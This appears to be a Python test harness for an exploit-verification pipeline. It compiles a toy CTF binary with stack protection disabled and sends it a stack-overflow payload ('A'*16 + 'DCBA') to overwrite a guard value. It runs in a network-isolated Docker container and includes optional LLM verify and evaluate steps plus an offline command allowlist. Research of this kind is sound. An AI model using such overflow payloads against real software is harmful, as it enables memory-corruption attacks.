"""
Feasibility test with a minimal pwn challenge (offline-friendly).

No planner/executor agents are used here.
Flow:
  verify step intent (optionally with LLM) -> execute locally (or via docker) -> evaluate (optionally with LLM)
"""

from __future__ import annotations

import os
import shutil
import subprocess
from pathlib import Path
from typing import Any, Optional

from execution_types import EvaluationResult, VerificationResult

# Optional imports: if your environment doesn't have langchain/openai/dotenv,
# the script will still run with offline fallbacks.
try:
    from verification_agent import verify_proposed_operation  # type: ignore
except Exception:  # pragma: no cover
    verify_proposed_operation = None

try:
    from evaluator_agent import evaluate_execution_trace  # type: ignore
except Exception:  # pragma: no cover
    evaluate_execution_trace = None


def _host_has_docker() -> bool:
    return shutil.which("docker") is not None


def _run_in_docker(image: str, work_mount: Path, cmd: str, *, input_bytes: Optional[bytes] = None) -> subprocess.CompletedProcess[str]:
    # Run in Linux container: mount target_codebase to /workspace.
    # Use --network none to avoid accidental outbound.
    docker_exe = shutil.which("docker")
    if not docker_exe:
        raise RuntimeError("docker not found in PATH")

    host_dir = str(work_mount.resolve())
    docker_cmd = [
        docker_exe,
        "run",
        "--rm",
        "--network",
        "none",
        "-v",
        f"{host_dir}:/workspace",
        "-w",
        "/workspace",
        image,
        "sh",
        "-c",
        cmd,
    ]

    return subprocess.run(
        docker_cmd,
        input=input_bytes,
        capture_output=True,
        text=True if input_bytes is None else False,
        timeout=180,
        shell=False,
    )


def _execute_step(step: dict[str, Any]) -> dict[str, Any]:
    """
    Execute the fixed exploit verification steps.
    Returns execution trace: {exit_code, stdout, stderr, error_message}
    """
    work = Path(__file__).resolve().parent / "target_codebase"
    use_docker = _host_has_docker()

    if step["step_id"] == "1":
        # Compile pwn_easy.c
        cmd = "gcc -O0 -fno-stack-protector -no-pie -o pwn_easy pwn_easy.c"
        if use_docker:
            proc = subprocess.run(
                [
                    "docker",
                    "run",
                    "--rm",
                    "--network",
                    "none",
                    "-v",
                    f"{work.resolve()}:/workspace",
                    "-w",
                    "/workspace",
                    "gcc:13",
                    "sh",
                    "-c",
                    cmd,
                ],
                capture_output=True,
                text=True,
                timeout=180,
            )
        else:
            proc = subprocess.run(cmd, shell=True, cwd=str(work), capture_output=True, text=True, timeout=180)
        return {
            "exit_code": proc.returncode,
            "stdout": proc.stdout or "",
            "stderr": proc.stderr or "",
            "error_message": None if proc.returncode == 0 else "compile failed",
        }

    if step["step_id"] == "2":
        # Trigger: write padding + DCBA to control guard value.
        payload = b"AAAAAAAAAAAAAAAADCBA"  # 16 'A' + 'DCBA'
        cmd = "cat | ./pwn_easy"
        if use_docker:
            docker_exe = shutil.which("docker")
            if not docker_exe:
                raise RuntimeError("docker not found")
            proc = subprocess.run(
                [
                    docker_exe,
                    "run",
                    "--rm",
                    "--network",
                    "none",
                    "-i",
                    "-v",
                    f"{work.resolve()}:/workspace",
                    "-w",
                    "/workspace",
                    "gcc:13",
                    "sh",
                    "-c",
                    cmd,
                ],
                input=payload,
                capture_output=True,
                text=True,
                timeout=60,
            )
        else:
            proc = subprocess.run(
                "./pwn_easy",
                cwd=str(work),
                input=payload,
                capture_output=True,
                text=True,
                timeout=60,
            )
        return {
            "exit_code": proc.returncode,
            "stdout": proc.stdout or "",
            "stderr": proc.stderr or "",
            "error_message": None if proc.returncode == 0 else "run failed",
        }

    return {"exit_code": None, "stdout": "", "stderr": "", "error_message": "unknown step"}


def run() -> None:
    print("=== Pwn feasibility test (verify + evaluate, no planning/execution agents) ===")
    phase1_context = '{"vulnerabilities":[{"id":"pwn-ret2guard-001","type":"stack overflow","file":"target_codebase/pwn_easy.c"}]}'

    steps = [
        {
            "step_id": "1",
            "title": "Compile challenge",
            "description": "Build pwn_easy.c with mitigations disabled.",
            "command": "gcc -O0 -fno-stack-protector -no-pie -o pwn_easy pwn_easy.c",
            "related_cwe": "CWE-120",
            "expected_signal": "binary generated",
        },
        {
            "step_id": "2",
            "title": "Trigger overflow to overwrite guard",
            "description": "Send 16-byte padding + DCBA to set guard=0x41424344.",
            "command": "run ./pwn_easy with input A*16 + DCBA",
            "related_cwe": "CWE-120",
            "expected_signal": "program prints FLAG",
        },
    ]

    have_api = bool(os.environ.get("DEEPSEEK_API_KEY"))
    llm_ok = have_api and verify_proposed_operation is not None and evaluate_execution_trace is not None

    for step in steps:
        print(f"\n[Step {step['step_id']}] {step['title']}")

        if llm_ok:
            try:
                vr = verify_proposed_operation(step, phase1_context=phase1_context, use_cwe_tools=False)  # type: ignore[misc]
            except Exception:
                vr = VerificationResult(
                    decision="NEEDS_REVISION",
                    reason="verification failed (exception), fallback to offline safety gate",
                    risk_notes=[],
                    raw_json=None,
                )
        else:
            # Offline safety gate: only allow our known compile/run intent.
            cmd = str(step.get("command", ""))
            safe = ("gcc " in cmd and "pwn_easy" in cmd) or ("./pwn_easy" in cmd) or ("run ./pwn_easy" in cmd)
            vr = VerificationResult(
                decision="APPROVE" if safe else "REJECT",
                reason="offline fallback verification",
                risk_notes=[],
                raw_json=None,
            )

        print(f"  verify: {vr.decision} | {vr.reason}")
        if vr.decision != "APPROVE":
            print("  skip execution due to verification decision")
            continue

        trace = _execute_step(step)
        if trace.get("error_message"):
            print(f"  execute error: {trace['error_message']}")
        else:
            print(f"  execute exit_code={trace.get('exit_code')}")

        if llm_ok:
            try:
                ev = evaluate_execution_trace(step, trace, phase1_context=phase1_context, use_cwe_tools=False)  # type: ignore[misc]
            except Exception:
                llm_ok = False  # fallback for the rest
                ev = EvaluationResult(
                    decision="INCONCLUSIVE",
                    confidence=0.2,
                    rationale="evaluation failed (exception), offline fallback",
                    evidence_summary=str(trace.get("stdout", ""))[:120],
                    suggested_next_action=None,
                    raw_json=None,
                )
        if not llm_ok:
            out = str(trace.get("stdout", ""))
            hit = "FLAG{pwn_feasibility_success}" in out
            ev = EvaluationResult(
                decision="SUCCESS" if hit else "FAILED",
                confidence=0.9 if hit else 0.4,
                rationale="offline fallback evaluation",
                evidence_summary=out[:200] if out else "no stdout",
                suggested_next_action=None if hit else "check payload/guard endianness and rerun",
                raw_json=None,
            )

        print(f"  evaluate: {ev.decision} confidence={ev.confidence:.2f}")
        print(f"  evidence: {ev.evidence_summary}")
        if ev.suggested_next_action:
            print(f"  next: {ev.suggested_next_action}")


if __name__ == "__main__":
    run()
